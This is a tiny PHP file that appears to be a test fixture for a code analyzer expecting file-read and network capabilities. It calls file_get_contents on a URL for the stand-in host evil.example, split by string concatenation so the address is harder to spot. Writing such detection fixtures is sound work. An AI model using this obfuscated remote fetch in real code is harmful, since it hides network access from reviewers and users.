<?php
namespace Pkg;
// @expect: FILE_READ, NETWORK
function grab(string $where): string
{
    return (string) file_get_contents($where);
}

grab('ht' . 'tps://evil.example/x');
